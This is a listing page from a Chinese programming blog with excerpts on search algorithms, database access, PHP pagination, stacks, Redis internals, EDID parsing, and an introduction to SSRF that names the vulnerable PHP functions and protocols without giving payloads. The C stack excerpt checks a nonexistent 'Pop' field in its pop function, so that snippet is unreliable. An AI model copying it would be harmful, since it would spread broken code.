<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca326c84223be5e12f2855e29daef43f/" rel="bookmark">
			查找算法：顺序(线性)查找、二分(折半)查找、插值查找
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 顺序查找二分查找（递归和非递归实现）插值查找 顺序查找 线性查找指按一定的顺序检查数组中每一个元素，直到找到所要寻找的特定值为止。
/** * @ClassName SeqSearch * @author: shouanzh * @Description 线性查找 * @date 2022/5/11 20:02 */ public class SeqSearch { public static void main(String[] args) { int[] array = new int[]{10, 3, -1, 9, 20, -3}; int i = seqSearch(array, 9); if (i == -1) { System.out.println("没有该值"); } else { System.out.println(array[i]); } } /** * 线性查找 * 线性查找是逐一比对，发现有相同值，就返回下标 * * 这里我们实现的线性查找是找到一个满足条件的值，就返回 * 如果存在多个可以遍历全部，可以返回集合 * @param array * @param value * @return 返回下标 */ public static int seqSearch(int[] array, int value) { for (int i = 0; i &lt; array.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca326c84223be5e12f2855e29daef43f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92349662f31cc2bf3572f1e14db1ee3a/" rel="bookmark">
			python用于写后台接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里只是作为一些博客简单的拼接
前提 mySQL安装
还有一个可视化工具的安装，我用的Navicat
1、数据库相关操作 新建数据库
新建表
2、python操作数据库 python连接数据库
import pymysql # 打开数据库连接(加入默认db，否则会找不到对应的db) conn = pymysql.connect(host='localhost', port=3306, user='root', passwd='xxx', db='xxx', charset = 'utf8' ) # 使用 cursor() 方法创建一个游标对象 cursor cursor = conn.cursor() # 使用 execute() 方法执行 SQL 查询 cursor.execute("show databases;") sqlNum = "select stuNum from userdb where stuNum='xxx'" res = cursor.execute(sqlNum) print(res, 'res') cursor.execute("show databases;") # cursor.execute("use database_name;") # cursor.execute("show tables;") # cursor.execute("select * from tables_name") # 使用 fetchone() 方法获取单条数据;使用 fetchall() 方法获取所有数据 data = cursor.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92349662f31cc2bf3572f1e14db1ee3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0e5b057b65317fe67ec2f365bb14e5a/" rel="bookmark">
			PHP分页类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分页类1：
&lt;?php /** * 分页类 * * 调用方式： * $p=new Page(总条数,显示页数,当前页码,每页显示条数,[链接]); * print_r($p-&gt;getPages()); //生成一个页码数组（键为页码，值为链接） * echo $p-&gt;showPages(1); //生成一个页码样式（可添加自定义样式） * */ /* 总条数，需要显示的页数，当前页，每页显示的条数，连接 生成一个一维数组，键为页码 值为连接 返回一个生成好样式的页码（并且可以根据自己需要添加样式） 默认样式 共45条记录,每页显示10条,当前第1/4页 [首页] [上页] [1] [2] [3] .. [下页] [尾页] */ class Page{ protected $count; //总条数 protected $showPages; //需要显示的页数 protected $countPages; //总页数 protected $currPage; //当前页 protected $subPages; //每页显示条数 protected $href; //连接 protected $page_arr=array(); //保存生成的页码 键页码 值为连接 /** * __construct 构造函数（获取分页所需参数） * @param int $count 总条数 * @param int $showPages 显示页数 * @param int $currPage 当前页数 * @param int $subPages 每页显示数量 * @param string $href 连接（不设置则获取当前URL） */ public function __construct($count,$showPages,$currPage,$subPages,$href=''){ $this-&gt;count=$count; $this-&gt;showPages=$showPages; $this-&gt;currPage=$currPage; $this-&gt;subPages=$subPages; //如果链接没有设置则获取当前连接 if(empty($href)){ $this-&gt;href=htmlentities($_SERVER['PHP_SELF']); }else{ $this-&gt;href=$href; } $this-&gt;construct_Pages(); } /** * getPages 返回页码数组 * @return array 一维数组 键为页码 值为链接 */ public function getPages(){ return $this-&gt;page_arr; } /** * showPages 返回生成好的页码 * @param int $style 样式 * @return string 生成好的页码 */ public function showPages($style=1){ $func='pageStyle'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0e5b057b65317fe67ec2f365bb14e5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce6c6a55e35e6478c8e9aa39a09941b4/" rel="bookmark">
			数据结构——堆栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		堆栈：具有一定操作约束的线性表只在一端（栈顶，Top）做插入，删除
插入数据：入栈；删除数据：出栈；后入后出：Last In First Out(LIFO)
数据对象集：一个有0个或多个元素的有穷线性表。
操作集：长度为MaxSize的堆栈S∈Stack，堆栈元素item∈ElementType
1、Stack CreateStack(int MaxSize):生成空堆栈，其最大长度为MaxSize;
2、int IsFull(Stack S,int MaxSize):判断堆栈S是否已满；
3、void Push(Stack S, ElementType item):将元素item压入堆栈
4、int IsEmpty(Stack S):判断堆栈S是否为空：
5、ElementType Pop(Stack S):删除并返回栈顶元素；
一、栈的顺序存储实现
栈的顺序存储结构通常由一个一维数组和一个记录栈顶元素位置的变量组成
#define MaxSize&lt;储存数据元素的最大个数&gt; typedef struct SNode *Stack; struct SNode{ ElementType Data[MaxSize]; int Top; }; 1)入栈
void Push(Stack PtrS,ElementType item) { if(PtrS-&gt;Top==MaxSize-1) { printf("堆栈满");return; } else { PtrS-&gt;Data[++(PtrS-&gt;Top)]=item; return; } } 2)出栈
ElementType Pop(Stack PtrS) { if(PtrS-&gt;Pop==-1) { printf("堆栈空"); return ERROR; } else return(PtrS-&gt;Data[(PtrS-&gt;Top)--]); } 二、堆栈的链式存储实现
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce6c6a55e35e6478c8e9aa39a09941b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff63592593cd3b50603b37ae578185ce/" rel="bookmark">
			setNavigationBarTitle
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 wx.setNavigationBarTitle就是用来改红框框里面的内容滴
在项目开发中经常用到
使用的场景就包括了多个地方用同一套页面的时候
wx.setNavigationBarTitle({ title: "我的店铺", }); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a544a539f4620442b10bf89cba1dfd0c/" rel="bookmark">
			从0到1完全掌握 SSRF
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：https://www.freebuf.com/articles/web/333318.html
Drunkbaby 2022-05-16 22:00:25
40630
博客地址 芜风
从0到1完全掌握 SSRF 二刷漏洞：知其所以然 &lt;-&gt; 知其然 -&gt; 懂其攻 -&gt; 知其守
主要结合 SSRF-Lab 进行 SSRF 的学习。
搭建SSRF-Lab 0x01 前言 刚二刷完 CSRF，继续 SSRF
SSRF 主要是由于一些危险函数与危险协议产生的。我们以 PHP 为例，列举一下这些危险函数。
file_get_contents() fsockopen() curl_exec() SoapClient 一些危险协议 file:// gopher dict etc... 0x02 知其然：什么是 SSRF? 先挂一张生动的图 攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……
SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。
正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。 0x03 SSRF 的原理 从一般的面试角度出发的话，有几个针对 SSRF 常见的面试问题。 SSRF 中可以利用的协议有哪一些？SSRF 中能利用的函数一般有哪些？讲一讲 CTF 中有没有遇到过 SSRF，当时是怎么解决的。SSRF 的原理 如果不在知道原理的基础上回答这些问题，很多都只是有一知半解的感觉，所以我们先把原理讲清楚了再进行下一步。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a544a539f4620442b10bf89cba1dfd0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebf2b673e56e50664203a2b2a1af9369/" rel="bookmark">
			stream流对list的操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@Test public void test1(){ List&lt;Map&lt;String,Object&gt;&gt; list2 = new ArrayList&lt;&gt;(); Map&lt;String,Object&gt; map1 = new HashMap&lt;&gt;(); map1.put("region", "410185"); map1.put("positionText", "服务员"); map1.put("urgent", "1"); list2.add(map1); Map&lt;String,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put("region", "410100"); map2.put("positionText", "按摩师"); map2.put("urgent", "2"); list2.add(map2); Map&lt;String,Object&gt; map3 = new HashMap&lt;&gt;(); map3.put("region", "410100"); map3.put("positionText", "服务员"); map3.put("urgent", "2"); list2.add(map3); Map&lt;String,Object&gt; map4 = new HashMap&lt;&gt;(); map4.put("region", "410155"); map4.put("positionText", "会计"); map4.put("urgent", "1"); list2.add(map4); List&lt;Map&lt;String, Object&gt;&gt; groupList = list2.stream().collect(Collectors.groupingBy(d -&gt; d.get("region"))).entrySet() .stream().map(d -&gt; { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebf2b673e56e50664203a2b2a1af9369/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e68e4f9fd634ae46b6f5eb7a3ebce0f/" rel="bookmark">
			Redis常用数据结构底层实现与验证-String
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在比较老的版本中，Redis支持的数据结构一共有五种，分别是：String、Sets、Sorted Sets、Lists 、Hashes ；这五种数据结构也是我们在日常工作中目前使用最多的结构，满足了我们大部分的业务场景，在最新版的Redis版本中，又新增了Bitmaps、Bitfields、HyperLogLog、Geospatial indexes 、Streams 这样的五种数据结构，更加多样化的满足我们日常的使用场景。我们当前主要是来了解一下我们常用的五种数据结构在Redis实现过程中底层所采用的存储结构，并对不同场景进行必要的验证，这样的对我们在日常工作中更为合理的设计提供了必要的帮助，同时可以让我们以更加低的成本，更加快速的方式实现我们所需要的效果，今天我们来看一下我们最常用的String结构的底层实现方案，通过一些简单的方法来验证一下我们探究的东西，这样对我们以后进一步的使用它提供实践基础
Redis Object Redis中的不同数据结构在存储的时候都是存在一个叫redisObject的结构体中，对应的C语言代码如下：
typedef struct redisObject { unsigned type:4; unsigned encoding:4; unsigned lru:LRU_BITS; int refcount; void *ptr; } robj; 对于不同的数据结构，只需要分配不同的存储空间大小，然后调整不同的type类型和encoding编码格式，就可以有效的实现这些常用存储结构，同时通过ptr这个指针，可以根据type的不同指向不同的存储结构中，即保证了上层结构的统一性，又保证了底层实现的多样性。有了对这个结构体的简单的了解，我们再来梳理下面的内容
Redis中String的底层数据结构 在了解String类型数据结构前，我们先来看一下Redis中为了性能更加优秀而自定义的一种字符串类型：SDS (Simple Dynamic String)，该自定义字符串类型主要的特点如下：
获取字符串长度的时间复杂度是O(1),因为该结构体中的len字段保存了当前字符串的长度支持安全的二进制数据存储，字符串的结束不再依赖于’\0’来表示，可以通过len的长度来确定实际的字符串的长度啦动态扩容机制，在没有达到最大扩容限制之前，每次动态扩容会是原来的内存空间的2倍，有效降低扩容的次数字符串的长度不再依赖于字节数组的长度的判断，这样就可以预分配一些数组长度，来减少内存分配的次数，提高效率惰性释放内存空间，当字符串修改时并不会马上对对应的内存空间进行释放，而是留着这些内存空间供后续的该字符串的变更来使用，如果存储空间触发了某些条件，才会真正的对这些空闲内存进行释放，避免内存泄漏 SDS （简单动态字符串） typedef char *sds; struct __attribute__ ((__packed__)) sdshdr5 { unsigned char flags; /* 3 lsb of type, and 5 msb of string length */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr8 { uint8_t len; /* used */ uint8_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr16 { uint16_t len; /* used */ uint16_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr32 { uint32_t len; /* used */ uint32_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr64 { uint64_t len; /* used */ uint64_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; Redis中不同数据结构中的Key的底层存储方案 Redis中不同的数据结构我们主要是针对于存储的Value来说的，所以我们有的时候很少会去关注Redis中的Key的具体存储方案，在Redis中，不管是String类型数据结构，还是List类型的数据结构，他们的存储的Key都是按照SDS字符串来进行处理的，不管你存储的时候的Key是一个整数、或者是一个字符串、或者是一个小数，底层都会按照SDS来处理方式来进行存储
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e68e4f9fd634ae46b6f5eb7a3ebce0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c97fae036ec12a175931908ba572cf82/" rel="bookmark">
			Go 通过etherscan api访问接囗报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0、前提条件 （1）操作系统 操作系统Windows10中进行开发测试
（2）参考代码 GitHub - nanmu42/etherscan-api: Golang client for Ethereum Etherscan API (and its families like BscScan) / Golang 以太坊 Etherscan API库（也支持同一家族的BscScan）
注：已使用科学上网
1、测试代码 import ( "github.com/nanmu42/etherscan-api" "fmt" ) func main() { // create a API client for specified ethereum net // there are many pre-defined network in package client := etherscan.New(etherscan.Mainnet, "xxxxxxxx") // check account balance balance, err := client.AccountBalance("xxxxxxxx") if err != nil { panic(err) } // balance in wei, in *big.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c97fae036ec12a175931908ba572cf82/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c42d9eee745789466bea5217f7d6abf8/" rel="bookmark">
			CTA-861标准解析EDID的VSDB与VDB
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前在某项目上做屏幕自适应分辨率时，按照vesa标准解析edid得出的分辨率不全导致自适应功能概率性失效，换为CTA 861标准解析后功能正常。此功能的代码对数据结构知识的要求不高，但是对C语言能力要求较高，特别是数位移、临界值的判断以及接口构建等操作。正好锻炼逻辑能力与熟悉基础语法。
花了一下午写了VSDB与VDB解析的接口，除了vic数组其余全部手码，代码如下：
#include &lt;stdio.h&gt; //static int edid[] = { //0x00,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x22,0x0e,0xd5,0x36,0x01,0x01,0x01,0x01, //0x1b,0x1f,0x01,0x03,0x80,0x3c,0x22,0x78,0x2e,0xee,0x95,0xa3,0x54,0x4c,0x99,0x26, //0x0f,0x50,0x54,0xa1,0x08,0x00,0xd1,0xc0,0xa9,0xc0,0xa9,0x40,0xd1,0x00,0xb3,0x00, //0x95,0x00,0x81,0x00,0x81,0x80,0x4d,0xd0,0x00,0xa0,0xf0,0x70,0x3e,0x80,0x30,0x20, //0x35,0x00,0x55,0x50,0x21,0x00,0x00,0x1a,0x00,0x00,0x00,0xfd,0x00,0x1d,0x3c,0x1c, //0x87,0x3c,0x00,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x00,0x00,0x00,0xfc,0x00,0x48, //0x50,0x20,0x5a,0x32,0x37,0x6b,0x20,0x47,0x33,0x0a,0x20,0x20,0x00,0x00,0x00,0xff, //0x00,0x43,0x4e,0x34,0x31,0x32,0x37,0x34,0x32,0x46,0x30,0x0a,0x20,0x20,0x01,0x1c, // //0x02,0x03,0x30,0xb1,0x51,0x61,0x10,0x04,0x03,0x02,0x1f,0x13,0x12,0x11,0x5f,0x05, //0x14,0x07,0x06,0x16,0x15,0x01,0x6b,0x03,0x0c,0x00,0x10,0x00,0x38,0x3c,0x20,0x00, //0x20,0x01,0x67,0xd8,0x5d,0xc4,0x01,0x78,0x80,0x03,0xe2,0x0f,0x01,0xe2,0x00,0x6b, //0xa3,0x66,0x00,0xa0,0xf0,0x70,0x1f,0x80,0x30,0x20,0x35,0x00,0x55,0x50,0x21,0x00, //0x00,0x1a,0x02,0x3a,0x80,0x18,0x71,0x38,0x2d,0x40,0x58,0x2c,0x45,0x00,0x55,0x50, //0x21,0x00,0x00,0x1e,0x28,0x3c,0x80,0xa0,0x70,0xb0,0x23,0x40,0x30,0x20,0x36,0x00, //0x55,0x50,0x21,0x00,0x00,0x1a,0x56,0x5e,0x00,0xa0,0xa0,0xa0,0x29,0x50,0x30,0x20, //0x35,0x00,0x55,0x50,0x21,0x00,0x00,0x1a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xec //}; struct timings { unsigned hact, vact; unsigned hratio, vratio; unsigned pixclk_khz; unsigned rb; bool interlaced; int hfp; unsigned hsync; int hbp; bool pos_pol_hsync; unsigned vfp, vsync; int vbp; bool pos_pol_vsync; unsigned hborder, vborder; bool even_vtotal; bool no_pol_vsync; unsigned hsize_mm, vsize_mm; bool ycbcr420; }; typedef struct panel_info { int vic; int hact, vact; double refresh; int hratio, vratio; double freq_khz; double pixclk; }panel_info; typedef struct vsdb_info { int vic_len; int vic_add; }vsdb_info; typedef struct vdb_info { int vic_len; int vic_add; }vdb_info; static int edid_hdmi_mode_map[] = { 95, 94, 93, 98 }; static const struct timings edid_cta_modes[] = { /* VIC 1 */ { 640, 480, 4, 3, 25175, 0, false, 16, 96, 48, false, 10, 2, 33, false }, { 720, 480, 4, 3, 27000, 0, false, 16, 62, 60, false, 9, 6, 30, false }, { 720, 480, 16, 9, 27000, 0, false, 16, 62, 60, false, 9, 6, 30, false }, { 1280, 720, 16, 9, 74250, 0, false, 110, 40, 220, true, 5, 5, 20, true }, { 1920, 1080, 16, 9, 74250, 0, true, 88, 44, 148, true, 2, 5, 15, true }, { 1440, 480, 4, 3, 27000, 0, true, 38, 124, 114, false, 4, 3, 15, false }, { 1440, 480, 16, 9, 27000, 0, true, 38, 124, 114, false, 4, 3, 15, false }, { 1440, 240, 4, 3, 27000, 0, false, 38, 124, 114, false, 4, 3, 15, false }, { 1440, 240, 16, 9, 27000, 0, false, 38, 124, 114, false, 4, 3, 15, false }, { 2880, 480, 4, 3, 54000, 0, true, 76, 248, 228, false, 4, 3, 15, false }, /* VIC 11 */ { 2880, 480, 16, 9, 54000, 0, true, 76, 248, 228, false, 4, 3, 15, false }, { 2880, 240, 4, 3, 54000, 0, false, 76, 248, 228, false, 4, 3, 15, false }, { 2880, 240, 16, 9, 54000, 0, false, 76, 248, 228, false, 4, 3, 15, false }, { 1440, 480, 4, 3, 54000, 0, false, 32, 124, 120, false, 9, 6, 30, false }, { 1440, 480, 16, 9, 54000, 0, false, 32, 124, 120, false, 9, 6, 30, false }, { 1920, 1080, 16, 9, 148500, 0, false, 88, 44, 148, true, 4, 5, 36, true }, { 720, 576, 4, 3, 27000, 0, false, 12, 64, 68, false, 5, 5, 39, false }, { 720, 576, 16, 9, 27000, 0, false, 12, 64, 68, false, 5, 5, 39, false }, { 1280, 720, 16, 9, 74250, 0, false, 440, 40, 220, true, 5, 5, 20, true }, { 1920, 1080, 16, 9, 74250, 0, true, 528, 44, 148, true, 2, 5, 15, true }, /* VIC 21 */ { 1440, 576, 4, 3, 27000, 0, true, 24, 126, 138, false, 2, 3, 19, false }, { 1440, 576, 16, 9, 27000, 0, true, 24, 126, 138, false, 2, 3, 19, false }, { 1440, 288, 4, 3, 27000, 0, false, 24, 126, 138, false, 2, 3, 19, false }, { 1440, 288, 16, 9, 27000, 0, false, 24, 126, 138, false, 2, 3, 19, false }, { 2880, 576, 4, 3, 54000, 0, true, 48, 252, 276, false, 2, 3, 19, false }, { 2880, 576, 16, 9, 54000, 0, true, 48, 252, 276, false, 2, 3, 19, false }, { 2880, 288, 4, 3, 54000, 0, false, 48, 252, 276, false, 2, 3, 19, false }, { 2880, 288, 16, 9, 54000, 0, false, 48, 252, 276, false, 2, 3, 19, false }, { 1440, 576, 4, 3, 54000, 0, false, 24, 128, 136, false, 5, 5, 39, false }, { 1440, 576, 16, 9, 54000, 0, false, 24, 128, 136, false, 5, 5, 39, false }, /* VIC 31 */ { 1920, 1080, 16, 9, 148500, 0, false, 528, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 16, 9, 74250, 0, false, 638, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 16, 9, 74250, 0, false, 528, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 16, 9, 74250, 0, false, 88, 44, 148, true, 4, 5, 36, true }, { 2880, 480, 4, 3, 108000, 0, false, 64, 248, 240, false, 9, 6, 30, false }, { 2880, 480, 16, 9, 108000, 0, false, 64, 248, 240, false, 9, 6, 30, false }, { 2880, 576, 4, 3, 108000, 0, false, 48, 256, 272, false, 5, 5, 39, false }, { 2880, 576, 16, 9, 108000, 0, false, 48, 256, 272, false, 5, 5, 39, false }, { 1920, 1080, 16, 9, 72000, 0, true, 32, 168, 184, true, 23, 5, 57, false, 0, 0, true }, { 1920, 1080, 16, 9, 148500, 0, true, 528, 44, 148, true, 2, 5, 15, true }, /* VIC 41 */ { 1280, 720, 16, 9, 148500, 0, false, 440, 40, 220, true, 5, 5, 20, true }, { 720, 576, 4, 3, 54000, 0, false, 12, 64, 68, false, 5, 5, 39, false }, { 720, 576, 16, 9, 54000, 0, false, 12, 64, 68, false, 5, 5, 39, false }, { 1440, 576, 4, 3, 54000, 0, true, 24, 126, 138, false, 2, 3, 19, false }, { 1440, 576, 16, 9, 54000, 0, true, 24, 126, 138, false, 2, 3, 19, false }, { 1920, 1080, 16, 9, 148500, 0, true, 88, 44, 148, true, 2, 5, 15, true }, { 1280, 720, 16, 9, 148500, 0, false, 110, 40, 220, true, 5, 5, 20, true }, { 720, 480, 4, 3, 54000, 0, false, 16, 62, 60, false, 9, 6, 30, false }, { 720, 480, 16, 9, 54000, 0, false, 16, 62, 60, false, 9, 6, 30, false }, { 1440, 480, 4, 3, 54000, 0, true, 38, 124, 114, false, 4, 3, 15, false }, /* VIC 51 */ { 1440, 480, 16, 9, 54000, 0, true, 38, 124, 114, false, 4, 3, 15, false }, { 720, 576, 4, 3, 108000, 0, false, 12, 64, 68, false, 5, 5, 39, false }, { 720, 576, 16, 9, 108000, 0, false, 12, 64, 68, false, 5, 5, 39, false }, { 1440, 576, 4, 3, 108000, 0, true, 24, 126, 138, false, 2, 3, 19, false }, { 1440, 576, 16, 9, 108000, 0, true, 24, 126, 138, false, 2, 3, 19, false }, { 720, 480, 4, 3, 108000, 0, false, 16, 62, 60, false, 9, 6, 30, false }, { 720, 480, 16, 9, 108000, 0, false, 16, 62, 60, false, 9, 6, 30, false }, { 1440, 480, 4, 3, 108000, 0, true, 38, 124, 114, false, 4, 3, 15, false }, { 1440, 480, 16, 9, 108000, 0, true, 38, 124, 114, false, 4, 3, 15, false }, { 1280, 720, 16, 9, 59400, 0, false, 1760, 40, 220, true, 5, 5, 20, true }, /* VIC 61 */ { 1280, 720, 16, 9, 74250, 0, false, 2420, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 16, 9, 74250, 0, false, 1760, 40, 220, true, 5, 5, 20, true }, { 1920, 1080, 16, 9, 297000, 0, false, 88, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 16, 9, 297000, 0, false, 528, 44, 148, true, 4, 5, 36, true }, { 1280, 720, 64, 27, 59400, 0, false, 1760, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 64, 27, 74250, 0, false, 2420, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 64, 27, 74250, 0, false, 1760, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 64, 27, 74250, 0, false, 440, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 64, 27, 74250, 0, false, 110, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 64, 27, 148500, 0, false, 440, 40, 220, true, 5, 5, 20, true }, /* VIC 71 */ { 1280, 720, 64, 27, 148500, 0, false, 110, 40, 220, true, 5, 5, 20, true }, { 1920, 1080, 64, 27, 74250, 0, false, 638, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 74250, 0, false, 528, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 74250, 0, false, 88, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 148500, 0, false, 528, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 148500, 0, false, 88, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 297000, 0, false, 528, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 297000, 0, false, 88, 44, 148, true, 4, 5, 36, true }, { 1680, 720, 64, 27, 59400, 0, false, 1360, 40, 220, true, 5, 5, 20, true }, { 1680, 720, 64, 27, 59400, 0, false, 1228, 40, 220, true, 5, 5, 20, true }, /* VIC 81 */ { 1680, 720, 64, 27, 59400, 0, false, 700, 40, 220, true, 5, 5, 20, true }, { 1680, 720, 64, 27, 82500, 0, false, 260, 40, 220, true, 5, 5, 20, true }, { 1680, 720, 64, 27, 99000, 0, false, 260, 40, 220, true, 5, 5, 20, true }, { 1680, 720, 64, 27, 165000, 0, false, 60, 40, 220, true, 5, 5, 95, true }, { 1680, 720, 64, 27, 198000, 0, false, 60, 40, 220, true, 5, 5, 95, true }, { 2560, 1080, 64, 27, 99000, 0, false, 998, 44, 148, true, 4, 5, 11, true }, { 2560, 1080, 64, 27, 90000, 0, false, 448, 44, 148, true, 4, 5, 36, true }, { 2560, 1080, 64, 27, 118800, 0, false, 768, 44, 148, true, 4, 5, 36, true }, { 2560, 1080, 64, 27, 185625, 0, false, 548, 44, 148, true, 4, 5, 36, true }, { 2560, 1080, 64, 27, 198000, 0, false, 248, 44, 148, true, 4, 5, 11, true }, /* VIC 91 */ { 2560, 1080, 64, 27, 371250, 0, false, 218, 44, 148, true, 4, 5, 161, true }, { 2560, 1080, 64, 27, 495000, 0, false, 548, 44, 148, true, 4, 5, 161, true }, { 3840, 2160, 16, 9, 297000, 0, false, 1276, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 16, 9, 297000, 0, false, 1056, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 16, 9, 297000, 0, false, 176, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 16, 9, 594000, 0, false, 1056, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 16, 9, 594000, 0, false, 176, 88, 296, true, 8, 10, 72, true }, { 4096, 2160, 256, 135, 297000, 0, false, 1020, 88, 296, true, 8, 10, 72, true }, { 4096, 2160, 256, 135, 297000, 0, false, 968, 88, 128, true, 8, 10, 72, true }, { 4096, 2160, 256, 135, 297000, 0, false, 88, 88, 128, true, 8, 10, 72, true }, /* VIC 101 */ { 4096, 2160, 256, 135, 594000, 0, false, 968, 88, 128, true, 8, 10, 72, true }, { 4096, 2160, 256, 135, 594000, 0, false, 88, 88, 128, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 297000, 0, false, 1276, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 297000, 0, false, 1056, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 297000, 0, false, 176, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 594000, 0, false, 1056, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 594000, 0, false, 176, 88, 296, true, 8, 10, 72, true }, { 1280, 720, 16, 9, 90000, 0, false, 960, 40, 220, true, 5, 5, 20, true }, { 1280, 720, 64, 27, 90000, 0, false, 960, 40, 220, true, 5, 5, 20, true }, { 1680, 720, 64, 27, 99000, 0, false, 810, 40, 220, true, 5, 5, 20, true }, /* VIC 111 */ { 1920, 1080, 16, 9, 148500, 0, false, 638, 44, 148, true, 4, 5, 36, true }, { 1920, 1080, 64, 27, 148500, 0, false, 638, 44, 148, true, 4, 5, 36, true }, { 2560, 